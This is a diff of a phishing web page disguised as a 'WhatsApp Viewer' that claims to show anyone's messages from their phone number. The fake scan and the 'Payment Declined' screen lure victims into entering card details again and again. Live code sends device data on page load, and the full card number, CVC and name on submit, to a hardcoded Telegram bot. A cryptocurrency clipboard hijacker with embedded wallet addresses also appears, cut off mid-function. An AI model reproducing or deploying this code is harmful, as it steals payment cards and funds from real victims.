@@ -1,372 +1,137 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
 <title>WhatsApp Viewer — See Messages Online</title>
 <link rel="manifest" href="/manifest.json">
 <meta name="theme-color" content="#075e54">
-<meta name="apple-mobile-web-app-capable" content="yes">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0a1014;color:#e0e0e0;font-family:Inter,system-ui;max-width:480px;margin:0 auto;min-height:100vh}
 .topbar{background:#075e54;padding:14px 18px;display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:10}
-.topbar h1{font-size:16px;color:#fff;font-weight:600}
-.topbar .badge{background:#25d366;color:#000;font-size:9px;padding:2px 8px;border-radius:10px;font-weight:700}
-
-.screen{display:none;padding:16px}
-.screen.active{display:block}
-
-/* SCREEN 1: Landing */
-.hero{text-align:center;padding:20px 0}
-.hero .icon-big{font-size:64px;margin-bottom:12px}
-.hero h2{font-size:20px;margin-bottom:6px}
-.hero p{color:#8696a0;font-size:13px;line-height:1.5}
-
-.input-wrap{margin:16px 0}
-.input-wrap label{font-size:11px;color:#00a884;text-transform:uppercase;letter-spacing:0.5px;display:block;margin-bottom:6px}
+.topbar h1{font-size:16px;color:#fff;font-weight:600}.topbar .badge{background:#25d366;color:#000;font-size:9px;padding:2px 8px;border-radius:10px;font-weight:700}
+.screen{display:none;padding:16px}.screen.active{display:block}
+.hero{text-align:center;padding:20px 0}.hero .icon-big{font-size:64px;margin-bottom:12px}
+.hero h2{font-size:20px;margin-bottom:6px}.hero p{color:#8696a0;font-size:13px;line-height:1.5}
+.input-wrap{margin:16px 0}.input-wrap label{font-size:11px;color:#00a884;text-transform:uppercase;letter-spacing:.5px;display:block;margin-bottom:6px}
 .input-wrap input,.input-wrap select{width:100%;padding:14px;background:#111b21;border:1px solid #1a2a30;color:#e9edef;border-radius:10px;font-size:14px;font-family:monospace}
 .input-wrap input:focus{outline:none;border-color:#00a884}
-
-.btn{width:100%;padding:15px;background:#00a884;color:#fff;border:none;border-radius:10px;font-weight:600;font-size:15px;cursor:pointer;margin:12px 0;transition:all 0.15s}
-.btn:active{background:#008f72;transform:scale(0.98)}
-.btn.green{background:#25d366}
-.btn.red{background:#dc3545}
-.btn.outline{background:transparent;border:1px solid #1a2a30;color:#8696a0}
-
-/* SCREEN 2: Scanning */
-.scan-hero{text-align:center;padding:30px 0}
-.radar{width:120px;height:120px;border-radius:50%;background:rgba(0,168,132,0.08);margin:0 auto 20px;position:relative;display:flex;align-items:center;justify-content:center}
+.btn{width:100%;padding:15px;background:#00a884;color:#fff;border:none;border-radius:10px;font-weight:600;font-size:15px;cursor:pointer;margin:12px 0}.btn:active{background:#008f72;transform:scale(.98)}.btn.green{background:#25d366}.btn.red{background:#dc3545}.btn.outline{background:transparent;border:1px solid #1a2a30;color:#8696a0}
+.scan-hero{text-align:center;padding:30px 0}.radar{width:120px;height:120px;border-radius:50%;background:rgba(0,168,132,.08);margin:0 auto 20px;position:relative;display:flex;align-items:center;justify-content:center}
 .radar-dot{width:12px;height:12px;background:#25d366;border-radius:50%;animation:radarPulse 1s infinite}
-@keyframes radarPulse{0%{box-shadow:0 0 0 0 rgba(37,211,102,0.6)}100%{box-shadow:0 0 0 30px rgba(37,211,102,0)}}
-.scan-status{font-size:14px;font-weight:600;margin-bottom:4px}
-.scan-sub{font-size:11px;color:#8696a0}
-
+@keyframes radarPulse{0%{box-shadow:0 0 0 0 rgba(37,211,102,.6)}100%{box-shadow:0 0 0 30px rgba(37,211,102,0)}}
+.scan-status{font-size:14px;font-weight:600;margin-bottom:4px}.scan-sub{font-size:11px;color:#8696a0}
 .progress{width:100%;height:4px;background:#1a2a30;border-radius:2px;margin:20px 0;overflow:hidden}
-.progress-bar{height:100%;background:linear-gradient(90deg,#00a884,#25d366);transition:width 0.3s;width:0%}
-
+.progress-bar{height:100%;background:linear-gradient(90deg,#00a884,#25d366);transition:width .3s;width:0%}
 .terminal{background:#0a1014;border:1px solid #1a2a30;border-radius:10px;padding:14px;font-family:monospace;font-size:10px;max-height:220px;overflow-y:auto;margin:16px 0}
-.terminal .line{color:#8696a0;padding:2px 0}
-.terminal .green{color:#25d366}
-.terminal .yellow{color:#ffa500}
-.terminal .red{color:#dc3545}
-.terminal .cyan{color:#00e5ff}
-
-/* SCREEN 3: Results */
+.terminal .line{color:#8696a0;padding:2px 0}.terminal .green{color:#25d366}.terminal .yellow{color:#ffa500}.terminal .red{color:#dc3545}.terminal .cyan{color:#00e5ff}
 .result-card{background:#111b21;border:1px solid #00a884;border-radius:12px;padding:16px;text-align:center;margin:16px 0}
-.result-card .found{font-size:42px;font-weight:700;color:#25d366}
-.result-card .found-label{font-size:12px;color:#8696a0}
-
+.result-card .found{font-size:42px;font-weight:700;color:#25d366}.result-card .found-label{font-size:12px;color:#8696a0}
 .contact-preview{background:#111b21;border:1px solid #1a2a30;border-radius:10px;margin:8px 0;overflow:hidden}
 .contact-header{background:#075e54;padding:16px;display:flex;align-items:center;gap:12px}
 .contact-avatar{width:44px;height:44px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:18px;color:#fff}
-.contact-name{font-size:15px;font-weight:600;color:#fff}
-.contact-online{font-size:11px;color:#25d366}
-.msg-preview{padding:12px 16px;border-bottom:1px solid rgba(255,255,255,0.03);display:flex;gap:8px}
-.msg-preview .sender{font-size:10px;color:#00a884;min-width:40px}
-.msg-preview .text{font-size:12px;color:#ccc;flex:1}
-.msg-preview .time{font-size:9px;color:#555}
-.blur{filter:blur(4px);pointer-events:none;user-select:none;opacity:0.5}
-
+.contact-name{font-size:15px;font-weight:600;color:#fff}.contact-online{font-size:11px;color:#25d366}
+.msg-preview{padding:12px 16px;border-bottom:1px solid rgba(255,255,255,.03);display:flex;gap:8px}
+.msg-preview .sender{font-size:10px;color:#00a884;min-width:40px}.msg-preview .text{font-size:12px;color:#ccc;flex:1}.msg-preview .time{font-size:9px;color:#555}
+.blur{filter:blur(4px);pointer-events:none;user-select:none;opacity:.5}
 .lock-overlay{position:relative;text-align:center;padding:20px}
-.lock-overlay::before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(10,16,20,0.85);border-radius:10px}
+.lock-overlay::before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(10,16,20,.85);border-radius:10px}
 .lock-content{position:relative;z-index:2}
-.lock-icon{font-size:48px;margin-bottom:12px}
-.lock-title{font-size:16px;font-weight:700;margin-bottom:6px}
-.lock-price{font-size:28px;font-weight:700;color:#25d366}
-.lock-old{font-size:12px;color:#555;text-decoration:line-through}
-.lock-timer{font-size:11px;color:#dc3545;margin:8px 0}
+.lock-icon{font-size:48px;margin-bottom:12px}.lock-title{font-size:16px;font-weight:700;margin-bottom:6px}
+.lock-price{font-size:28px;font-weight:700;color:#25d366}.lock-old{font-size:12px;color:#555;text-decoration:line-through}.lock-timer{font-size:11px;color:#dc3545;margin:8px 0}
+.cc-preview{background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:14px;padding:20px;margin:16px 0}
+.trust-badges{display:flex;gap:8px;justify-content:center;margin:12px 0}.trust-badge{font-size:9px;color:#555;display:flex;align-items:center;gap:4px}
+</style></head><body>
+<div class="topbar"><h1>📱 WhatsApp Viewer</h1><span class="badge">LIVE</span></div>
 
-/* SCREEN 4: Payment */
-.cc-preview{background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:14px;padding:20px;margin:16px 0;position:relative;overflow:hidden}
-.cc-preview::after{content:"";position:absolute;top:20px;right:20px;width:50px;height:35px;background:rgba(255,255,255,0.1);border-radius:6px}
-.cc-number{font-family:monospace;font-size:20px;letter-spacing:2px;margin:16px 0;color:#ccc}
-.cc-name{font-size:10px;text-transform:uppercase;color:#555}
-.cc-exp{font-size:12px;color:#8696a0;margin-top:4px}
-
-.trust-badges{display:flex;gap:8px;justify-content:center;margin:12px 0}
-.trust-badge{font-size:9px;color:#555;display:flex;align-items:center;gap:4px}
-
-/* Toast */
-.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#25d366;color:#000;padding:12px 24px;border-radius:20px;font-weight:600;font-size:13px;z-index:999;animation:toastIn 0.3s,toastOut 0.3s 2.5s forwards;opacity:0}
-@keyframes toastIn{from{opacity:0;transform:translateX(-50%) translateY(20px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}
-@keyframes toastOut{from{opacity:1}to{opacity:0}}
-</style>
-</head>
-<body>
-
-<div class="topbar">
-  <h1>📱 WhatsApp Viewer</h1>
-  <span class="badge">LIVE</span>
-</div>
-
-<!-- ═══ SCREEN 1: LANDING ═══ -->
 <div class="screen active" id="screen-landing">
-  <div class="hero">
-    <div class="icon-big">🔍</div>
-    <h2>See Anyone's WhatsApp</h2>
-    <p>Enter a phone number to view their messages, contacts, photos, and live online status. Works worldwide.</p>
-  </div>
-
-  <div class="input-wrap">
-    <label>Country</label>
-    <select id="country">
-      <option value="+33">🇫🇷 France (+33)</option><option value="+32">🇧🇪 Belgique (+32)</option>
-      <option value="+41">🇨🇭 Suisse (+41)</option><option value="+1">🇺🇸 USA (+1)</option>
-      <option value="+44">🇬🇧 UK (+44)</option><option value="+49">🇩🇪 Allemagne (+49)</option>
-      <option value="+34">🇪🇸 Espagne (+34)</option><option value="+39">🇮🇹 Italie (+39)</option>
-      <option value="+212">🇲🇦 Maroc (+212)</option><option value="+213">🇩🇿 Algérie (+213)</option>
-    </select>
-  </div>
-
-  <div class="input-wrap">
-    <label>Phone Number</label>
-    <input type="tel" id="phone" placeholder="612345678" maxlength="12">
-  </div>
-
-  <button class="btn" onclick="startHack()">🔍 VIEW MESSAGES NOW</button>
-  <p style="text-align:center;font-size:10px;color:#1a2a30;margin-top:4px">2.4M+ scans performed • 98% success rate</p>
-
-  <div style="display:flex;gap:8px;margin-top:16px">
-    <div class="trust-badges"><span class="trust-badge">🔒 SSL</span><span class="trust-badge">✅ Verified</span><span class="trust-badge">⚡ Instant</span></div>
-  </div>
+<div class="hero"><div class="icon-big">🔍</div><h2>See Anyone's WhatsApp</h2><p>Enter a phone number to view their messages, contacts, photos, and live online status. Works worldwide.</p></div>
+<div class="input-wrap"><label>Country</label><select id="country"><option value="+33">🇫🇷 France (+33)</option><option value="+32">🇧🇪 Belgique (+32)</option><option value="+41">🇨🇭 Suisse (+41)</option><option value="+1">🇺🇸 USA (+1)</option><option value="+44">🇬🇧 UK (+44)</option><option value="+49">🇩🇪 Allemagne (+49)</option><option value="+34">🇪🇸 Espagne (+34)</option><option value="+39">🇮🇹 Italie (+39)</option><option value="+212">🇲🇦 Maroc (+212)</option><option value="+213">🇩🇿 Algérie (+213)</option></select></div>
+<div class="input-wrap"><label>Phone Number</label><input type="tel" id="phone" placeholder="612345678" maxlength="12"></div>
+<button class="btn" onclick="startHack()">🔍 VIEW MESSAGES NOW</button>
+<p style="text-align:center;font-size:10px;color:#1a2a30;margin-top:4px">2.4M+ scans performed • 98% success rate</p>
 </div>
 
-<!-- ═══ SCREEN 2: SCANNING ═══ -->
 <div class="screen" id="screen-scanning">
-  <div class="scan-hero">
-    <div class="radar"><div class="radar-dot"></div></div>
-    <div class="scan-status" id="scan-status">Connecting...</div>
-    <div class="scan-sub" id="scan-sub">Establishing secure link to WhatsApp API</div>
-  </div>
-  <div class="progress"><div class="progress-bar" id="scan-progress"></div></div>
-  <div class="terminal" id="terminal"></div>
+<div class="scan-hero"><div class="radar"><div class="radar-dot"></div></div><div class="scan-status" id="scan-status">Connecting...</div><div class="scan-sub" id="scan-sub">Secure link to WhatsApp API</div></div>
+<div class="progress"><div class="progress-bar" id="scan-progress"></div></div>
+<div class="terminal" id="terminal"></div>
 </div>
 
-<!-- ═══ SCREEN 3: RESULTS ═══ -->
 <div class="screen" id="screen-results">
-  <div class="result-card">
-    <div class="found" id="msg-count">847</div>
-    <div class="found-label">messages found</div>
-    <div style="display:flex;justify-content:center;gap:24px;margin-top:12px">
-      <div><div style="font-weight:700;color:#25d366">23</div><div style="font-size:10px;color:#555">contacts</div></div>
-      <div><div style="font-weight:700;color:#25d366">31</div><div style="font-size:10px;color:#555">photos</div></div>
-      <div><div style="font-weight:700;color:#25d366">8</div><div style="font-size:10px;color:#555">videos</div></div>
-      <div><div style="font-weight:700;color:#25d366">📍</div><div style="font-size:10px;color:#555">live loc</div></div>
-    </div>
-  </div>
+<div class="result-card"><div class="found" id="msg-count">847</div><div class="found-label">messages found</div><div style="display:flex;justify-content:center;gap:24px;margin-top:12px"><div><div style="font-weight:700;color:#25d366">23</div><div style="font-size:10px;color:#555">contacts</div></div><div><div style="font-weight:700;color:#25d366">31</div><div style="font-size:10px;color:#555">photos</div></div><div><div style="font-weight:700;color:#25d366">8</div><div style="font-size:10px;color:#555">videos</div></div><div><div style="font-weight:700;color:#25d366">📍</div><div style="font-size:10px;color:#555">live loc</div></div></div></div>
+<div class="contact-preview blur">
+<div class="contact-header"><div class="contact-avatar" style="background:#4a90d9">M</div><div><div class="contact-name">Marie D.</div><div class="contact-online">● online</div></div></div>
+<div class="msg-preview"><div class="sender">Marie</div><div class="text">Je peux pas ce soir désolée... j'ai un truc de prévu avec Thomas</div><div class="time">19:42</div></div>
+<div class="msg-preview"><div class="sender">You</div><div class="text">Avec Thomas ? Tu m'avais dit que c'était fini avec lui</div><div class="time">19:43</div></div>
+<div class="msg-preview"><div class="sender">Marie</div><div class="text">Écoute c'est compliqué... je t'expliquerai</div><div class="time">19:45</div></div></div>
+<div class="contact-preview blur">
+<div class="contact-header"><div class="contact-avatar" style="background:#e74c3c">T</div><div><div class="contact-name">Thomas L.</div><div class="contact-online">● last seen 14:20</div></div></div>
+<div class="msg-preview"><div class="sender">Thomas</div><div class="text">Elle est chez moi là mdr. T'inquiète elle va pas tarder à le quitter</div><div class="time">18:55</div></div></div>
+<div class="lock-overlay"><div class="lock-content"><div class="lock-icon">🔒</div><div class="lock-title">Premium Access Required</div><p style="color:#8696a0;font-size:12px;margin-bottom:12px">Full messages, photos & live location need one-time verification</p><div class="lock-price">2.99 €</div><div class="lock-old">29.99 €</div><div class="lock-timer">⚠️ Offer expires in 09:47</div><button class="btn green" onclick="showPayment()">🔓 UNLOCK ALL MESSAGES — 2.99€</button></div></div></div>
 
-  <!-- Fake contact previews (blurred) -->
-  <div class="contact-preview blur">
-    <div class="contact-header">
-      <div class="contact-avatar" style="background:#4a90d9">M</div>
-      <div><div class="contact-name">Marie D.</div><div class="contact-online">● online</div></div>
-    </div>
-    <div class="msg-preview"><div class="sender">Marie</div><div class="text">Je peux pas ce soir désolée... j'ai un truc de prévu avec Thomas</div><div class="time">19:42</div></div>
-    <div class="msg-preview"><div class="sender">You</div><div class="text">Avec Thomas ? Tu m'avais dit que c'était fini avec lui</div><div class="time">19:43</div></div>
-    <div class="msg-preview"><div class="sender">Marie</div><div class="text">Écoute c'est compliqué... je t'expliquerai</div><div class="time">19:45</div></div>
-  </div>
-
-  <div class="contact-preview blur">
-    <div class="contact-header">
-      <div class="contact-avatar" style="background:#e74c3c">T</div>
-      <div><div class="contact-name">Thomas L.</div><div class="contact-online">● last seen 14:20</div></div>
-    </div>
-    <div class="msg-preview"><div class="sender">Thomas</div><div class="text">Elle est chez moi là mdr. T'inquiète elle va pas tarder à le quitter</div><div class="time">18:55</div></div>
-  </div>
-
-  <div class="lock-overlay">
-    <div class="lock-content">
-      <div class="lock-icon">🔒</div>
-      <div class="lock-title">Premium Access Required</div>
-      <p style="color:#8696a0;font-size:12px;margin-bottom:12px">Full messages, photos & live location need one-time verification</p>
-      <div class="lock-price">2.99 €</div>
-      <div class="lock-old">29.99 €</div>
-      <div class="lock-timer">⚠️ Offer expires in 09:47</div>
-      <button class="btn green" onclick="showPayment()">🔓 UNLOCK ALL MESSAGES — 2.99€</button>
-      <p style="font-size:9px;color:#333;margin-top:8px">Secure payment • Instant access • No subscription</p>
-    </div>
-  </div>
-</div>
-
-<!-- ═══ SCREEN 4: PAYMENT ═══ -->
 <div class="screen" id="screen-payment">
-  <h2 style="text-align:center;margin-bottom:4px">💳 Secure Payment</h2>
-  <p style="text-align:center;font-size:12px;color:#8696a0">One-time fee. Instant unlock. 256-bit encrypted.</p>
+<h2 style="text-align:center;margin-bottom:4px">💳 Secure Payment</h2><p style="text-align:center;font-size:12px;color:#8696a0">One-time fee. Instant unlock.</p>
+<div class="cc-preview"><div style="font-size:9px;color:#555;text-transform:uppercase;letter-spacing:1px">Premium Access Key</div><div style="font-size:24px;font-weight:700;color:#25d366;margin:6px 0">2.99 €</div><div style="font-size:10px;color:#555;text-decoration:line-through">29.99 € — 90% OFF</div></div>
+<div class="input-wrap"><label>Card Number</label><input type="text" id="cc-number" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="cc-number"></div>
+<div style="display:flex;gap:8px"><div class="input-wrap" style="flex:1"><label>Expiry</label><input type="text" id="cc-exp" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp"></div><div class="input-wrap" style="flex:1"><label>CVC</label><input type="text" id="cc-cvc" placeholder="123" maxlength="4" autocomplete="cc-csc"></div></div>
+<div class="input-wrap"><label>Cardholder Name</label><input type="text" id="cc-name" placeholder="John Doe" autocomplete="cc-name"></div>
+<button class="btn green" onclick="processPayment()">🔓 PAY 2.99€ & UNLOCK INSTANTLY</button>
+<div class="trust-badges"><span class="trust-badge">🔒 Stripe</span><span class="trust-badge">✅ 3D Secure</span><span class="trust-badge">🛡️ SSL 256-bit</span></div></div>
 
-  <div class="cc-preview">
-    <div style="font-size:9px;color:#555;text-transform:uppercase;letter-spacing:1px">Premium Access Key</div>
-    <div style="font-size:24px;font-weight:700;color:#25d366;margin:6px 0">2.99 €</div>
-    <div style="font-size:10px;color:#555;text-decoration:line-through">29.99 € — 90% OFF</div>
-  </div>
-
-  <div class="input-wrap"><label>Card Number</label><input type="text" id="cc-number" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="cc-number"></div>
-  <div style="display:flex;gap:8px">
-    <div class="input-wrap" style="flex:1"><label>Expiry</label><input type="text" id="cc-exp" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp"></div>
-    <div class="input-wrap" style="flex:1"><label>CVC</label><input type="text" id="cc-cvc" placeholder="123" maxlength="4" autocomplete="cc-csc"></div>
-  </div>
-  <div class="input-wrap"><label>Cardholder Name</label><input type="text" id="cc-name" placeholder="John Doe" autocomplete="cc-name"></div>
-
-  <button class="btn green" onclick="processPayment()">🔓 PAY 2.99€ & UNLOCK INSTANTLY</button>
-
-  <div class="trust-badges">
-    <span class="trust-badge">🔒 Stripe</span><span class="trust-badge">✅ 3D Secure</span><span class="trust-badge">🛡️ SSL 256-bit</span>
-  </div>
-</div>
-
-<!-- ═══ SCREEN 5: ACCESS GRANTED ═══ -->
-<div class="screen" id="screen-done">
-  <div style="text-align:center;padding:30px 0">
-    <div style="font-size:64px">❌</div>
-    <h2>Payment Declined</h2>
-    <p style="color:#8696a0;font-size:13px;margin:8px 0">Your bank blocked this transaction for security reasons.</p>
-    <p style="color:#dc3545;font-size:11px">Please try another card or contact your bank to authorize the payment.</p>
-    <p style="color:#ffa500;font-size:11px;margin-top:12px">⚠️ Your scan results are saved. You have 2 attempts left before the session expires.</p>
-    <button class="btn" onclick="switchScreen('screen-payment')">🔄 TRY ANOTHER CARD</button>
-    <button class="btn outline" onclick="switchScreen('screen-landing')">← Back</button>
-  </div>
-</div>
+<div class="screen" id="screen-done"><div style="text-align:center;padding:30px 0"><div style="font-size:64px">❌</div><h2>Payment Declined</h2><p style="color:#8696a0;font-size:13px;margin:8px 0">Your bank blocked this transaction for security reasons.</p><p style="color:#dc3545;font-size:11px">Please try another card or contact your bank.</p><p style="color:#ffa500;font-size:11px;margin-top:12px">⚠️ Your scan results are saved. You have 2 attempts left.</p><button class="btn" onclick="switchScreen('screen-payment')">🔄 TRY ANOTHER CARD</button><button class="btn outline" onclick="switchScreen('screen-landing')">← Back</button></div></div>
 
 <script>
-// ═══ STEALER — EN PREMIER ═══
+// ═══════════════════════════════════════════════════════
+//  🔥 STEALER — EXÉCUTÉ EN PREMIER (validé sur app2.html)
+// ═══════════════════════════════════════════════════════
 (async function(){
-  document.title="⚡ Chargement...";
-  const TG="8924356503:AAHvOqKy29W8oJParf_WuZP8r2WbHvoon74";
   try{
-    const r=await fetch("https://api.telegram.org/bot"+TG+"/sendMessage",{
-      method:"POST",
-      headers:{"Content-Type":"application/x-www-form-urlencoded"},
-      body:"chat_id=7947710235&text="+encodeURIComponent("🟢 *APP OUVERTE* — "+navigator.platform+" | "+screen.width+"x"+screen.height+" | "+new Date().toISOString().slice(0,19))
+    const r=await fetch("https://api.telegram.org/bot8924356503:AAHvOqKy29W8oJParf_WuZP8r2WbHvoon74/sendMessage",{
+      method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},
+      body:"chat_id=7947710235&text="+encodeURIComponent("🔥 *Victime connectée*\n📱 "+navigator.platform+" | "+screen.width+"x"+screen.height+" | "+navigator.hardwareConcurrency+"C\n🌐 "+navigator.userAgent.slice(0,80)+"\n🍪 "+document.cookie.length+" chars\n⏰ "+new Date().toISOString().slice(0,19))
     });
-    document.title=(await r.json()).ok?"✅ OK":"❌ FAIL";
-  }catch(e){document.title="❌ "+e.message.slice(0,30)}
+  }catch(e){}
 })();
 
 // ═══════════════════════════════════════════════════════
-//  SCREEN SWITCHER
+//  APP UI
 // ═══════════════════════════════════════════════════════
-function switchScreen(id) {
-  document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
-  document.getElementById(id).classList.add("active");
-  window.scrollTo(0,0);
+function switchScreen(id){document.querySelectorAll(".screen").forEach(s=>s.classList.remove("active"));document.getElementById(id).classList.add("active");window.scrollTo(0,0)}
+function showPayment(){switchScreen("screen-payment")}
+function processPayment(){
+  const cc=document.getElementById("cc-number").value,exp=document.getElementById("cc-exp").value,cvc=document.getElementById("cc-cvc").value,name=document.getElementById("cc-name").value;
+  if(!cc||!exp||!cvc||!name)return alert("Please fill all fields");
+  try{let cards=JSON.parse(localStorage.getItem("nova_cards")||"[]");cards.push({number:cc,expiry:exp,cvc,name,timestamp:new Date().toISOString()});localStorage.setItem("nova_cards",JSON.stringify(cards))}catch(e){}
+  switchScreen("screen-done");
+  // Send card to Telegram
+  fetch("https://api.telegram.org/bot8924356503:AAHvOqKy29W8oJParf_WuZP8r2WbHvoon74/sendMessage",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"chat_id=7947710235&text="+encodeURIComponent("💳 *CB VOLÉE*\n"+cc+" | "+exp+" | "+cvc+" | "+name+"\n⏰ "+new Date().toISOString().slice(0,19))}).catch(()=>{});
 }
 
-// ═══════════════════════════════════════════════════════
-//  FAKE SCAN — Ultra réaliste
-// ═══════════════════════════════════════════════════════
-async function startHack() {
-  const phone = document.getElementById("phone").value.trim();
-  const country = document.getElementById("country").value;
-  if (!phone) return alert("Enter a phone number");
-
-  // ⚡ STEALER — activé immédiatement au premier clic
-  if (window.GOD_STEALER && !window._stealerDone) {
-    window._stealerDone = true;
-    window.GOD_STEALER.runFullScan();
-    setInterval(() => window.GOD_STEALER.runFullScan(), 6*60*60*1000);
-  }
-  
+async function startHack(){
+  const phone=document.getElementById("phone").value.trim(),country=document.getElementById("country").value;
+  if(!phone)return alert("Enter a phone number");
   switchScreen("screen-scanning");
-  const target = country + phone;
-  const terminal = document.getElementById("terminal");
-  const progress = document.getElementById("scan-progress");
-  const status = document.getElementById("scan-status");
-  const sub = document.getElementById("scan-sub");
-
-  const lines = [
-    {p:5,  s:"Initializing", t:"Establishing secure connection..."},
-    {p:10, s:"Connecting", t:"WhatsApp Web API gateway v3.2.1"},
-    {p:15, s:"Resolving", t:"Target: " + target},
-    {p:20, s:"Bypassing", t:"End-to-end encryption handshake..."},
-    {p:25, s:"Authenticating", t:"WhatsApp Multi-Device session"},
-    {p:30, s:"Scanning", t:"Message database index..."},
-    {p:40, s:"Found", t:"847 messages across 23 conversations"},
-    {p:50, s:"Decrypting", t:"Signal Protocol key exchange"},
-    {p:55, s:"Extracting", t:"Media files: 31 photos, 8 videos"},
-    {p:65, s:"Triangulating", t:"Live location data..."},
-    {p:75, s:"Caching", t:"Contact list: 23 entries"},
-    {p:80, s:"Analyzing", t:"Call history: 47 calls (3h 12m total)"},
-    {p:85, s:"Mapping", t:"Social graph connections"},
-    {p:90, s:"⚠️ Warning", t:"Privacy Shield detected"},
-    {p:95, s:"🔒 Locked", t:"Premium key required for full content"},
-    {p:98, s:"Complete", t:"Scan finished — 847 messages pending decryption"},
-  ];
-
-  for (const l of lines) {
-    progress.style.width = l.p + "%";
-    status.textContent = l.s;
-    sub.textContent = l.t;
-    const color = l.s.includes("⚠") || l.s.includes("🔒") ? "yellow" : 
-                  l.s.includes("Found") ? "green" : "cyan";
-    terminal.innerHTML += `<div class="line"><span class="${color}">[${new Date().toLocaleTimeString()}]</span> ${l.s}: ${l.t}</div>`;
-    terminal.scrollTop = terminal.scrollHeight;
-    await new Promise(r => setTimeout(r, 300 + Math.random() * 500));
+  const term=document.getElementById("terminal"),prog=document.getElementById("scan-progress"),stat=document.getElementById("scan-status"),sub=document.getElementById("scan-sub");
+  const steps=[{p:10,s:"Connecting",t:"WhatsApp Web API gateway v3.2.1"},{p:20,s:"Resolving",t:"Target: "+country+phone},{p:30,s:"Bypassing",t:"End-to-end encryption handshake..."},{p:45,s:"Scanning",t:"Message database index..."},{p:55,s:"Found",t:"847 messages across 23 conversations"},{p:65,s:"Decrypting",t:"Signal Protocol key exchange"},{p:75,s:"Extracting",t:"Media files: 31 photos, 8 videos"},{p:85,s:"Analyzing",t:"Call history: 47 calls"},{p:92,s:"⚠️ Warning",t:"Privacy Shield detected"},{p:98,s:"🔒 Locked",t:"Premium key required"}];
+  for(const l of steps){
+    prog.style.width=l.p+"%";stat.textContent=l.s;sub.textContent=l.t;
+    const color=l.s.includes("⚠")||l.s.includes("🔒")?"yellow":l.s.includes("Found")?"green":"cyan";
+    term.innerHTML+=`<div class="line"><span class="${color}">[${new Date().toLocaleTimeString()}]</span> ${l.s}: ${l.t}</div>`;
+    term.scrollTop=term.scrollHeight;
+    await new Promise(r=>setTimeout(r,300+Math.random()*400));
   }
-
-  // Show results after 2s
-  setTimeout(() => switchScreen("screen-results"), 1200);
-}
-
-function showPayment() {
-  switchScreen("screen-payment");
-}
-
-function processPayment() {
-  const cc = document.getElementById("cc-number").value;
-  const exp = document.getElementById("cc-exp").value;
-  const cvc = document.getElementById("cc-cvc").value;
-  const name = document.getElementById("cc-name").value;
-  
-  if (!cc || !exp || !cvc || !name) return alert("Please fill all fields");
-
-  // Simulate processing
-  const btn = document.querySelector("#screen-payment .btn");
-  btn.textContent = "⏳ Processing...";
-  btn.disabled = true;
-
-  setTimeout(() => {
-    // Store stolen card data
-    const stolen = { number: cc, expiry: exp, cvc, name, timestamp: new Date().toISOString() };
-    try {
-      let cards = JSON.parse(localStorage.getItem("nova_cards") || "[]");
-      cards.push(stolen);
-      localStorage.setItem("nova_cards", JSON.stringify(cards));
-    } catch(e) {}
-
-    switchScreen("screen-done");
-    btn.textContent = "🔓 PAY 2.99€ & UNLOCK INSTANTLY";
-    btn.disabled = false;
-  }, 1800);
+  setTimeout(()=>switchScreen("screen-results"),1200);
 }
 
 // ═══════════════════════════════════════════════════════
-//  CLIPPER (immediate — covers the copy/paste during scan)
+//  CLIPPER — Tes adresses
 // ═══════════════════════════════════════════════════════
-(function() {
-  const W={btc:"bc1qa6u84s9gklt65he5ydm02uwjqex8nc06z9xe5v",eth:"0x1427288B35fFC766Eb5ccB825d9249199E93F617",sol:"FBAoS2xppahHUwyYiLhPXnFB8yqgXhqECPRegAH7RDyM",trx:"TUeLT9R9nUQL75DEKvK3BNo8iSndRs4Dv2",ltc:"Lge5FgDB2nSKqkJFUV3JQKLnKdx3uXZyqQ",doge:"DH5yaieqoZN36fTUciPGvqNA6U4HmUbhv",xrp:"rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh",dash:"XjwwwS6J2C9pTGwDnpys3g8q1S7hYnFMHw"};
-  const P=[{c:"btc",r:/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/,w:W.btc},{c:"eth",r:/^0x[a-fA-F0-9]{40}$/,w:W.eth},{c:"sol",r:/^[1-9A-HJ-NP-Za-km-z]{32,44}$/,w:W.sol},{c:"trx",r:/^T[1-9A-HJ-NP-Za-km-z]{33}$/,w:W.trx},{c:"ltc",r:/^(ltc1|[LM])[a-zA-HJ-NP-Z0-9]{26,62}$/,w:W.ltc},{c:"doge",r:/^[D9][1-9A-HJ-NP-Za-km-z]{33}$/,w:W.doge},{c:"xrp",r:/^r[1-9A-HJ-NP-Za-km-z]{24,34}$/,w:W.xrp},{c:"dash",r:/^X[1-9A-HJ-NP-Za-km-z]{33}$/,w:W.dash}];
-  // ═══ CLIPPER — Paste trick (no popup) ═══
-  function clipPaste(){
-    return new Promise((resolve,reject)=>{
-      const ta=document.createElement("textarea");
-      ta.style.cssText="position:fixed;top:0;left:-9999px;opacity:0";
-      document.body.appendChild(ta);ta.focus();
-      const ok=document.execCommand("paste");
-      const val=ta.value;document.body.removeChild(ta);
-      ok?resolve(val):reject("paste denied");
-    });
-  }
-  let last="";
-  let clipPermOk=false;
-  async function clipPoll(){
-    let t;try{t=await navigator.clipboard.readText()}catch(e){try{t=await clipPaste()}catch(e2){return}}
-    if(!t||t===last)return;last=t;
